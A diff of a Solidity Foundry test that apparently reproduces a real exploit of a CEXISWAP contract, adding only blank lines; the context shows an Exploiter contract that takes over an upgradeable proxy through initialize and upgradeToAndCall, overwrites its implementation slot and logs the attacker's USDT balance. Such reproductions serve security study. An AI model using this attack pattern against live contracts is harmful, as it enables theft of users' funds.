@@ -14,6 +14,7 @@ import "./../interface.sol";
 // https://twitter.com/DecurityHQ/status/1704759560614126030
 
 interface ICEXISWAP {
+
     function initialize(
         string memory name,
         string memory ticker,
@@ -24,9 +25,11 @@ interface ICEXISWAP {
     ) external;
 
     function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
+
 }
 
 contract CexiTest is Test {
+
     ICEXISWAP private constant CEXISWAP = ICEXISWAP(0xB8a5890D53dF78dEE6182A6C0968696e827E3305);
     IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
     Exploiter private exploiter;
@@ -42,9 +45,11 @@ contract CexiTest is Test {
         exploiter.exploit();
         emit log_named_decimal_uint("Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 6);
     }
+
 }
 
 contract Exploiter {
+
     ICEXISWAP private constant CEXISWAP = ICEXISWAP(0xB8a5890D53dF78dEE6182A6C0968696e827E3305);
     IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
     bytes32 private constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
@@ -71,4 +76,5 @@ contract Exploiter {
             sstore(slot, newImplementation)
         }
     }
+
 }
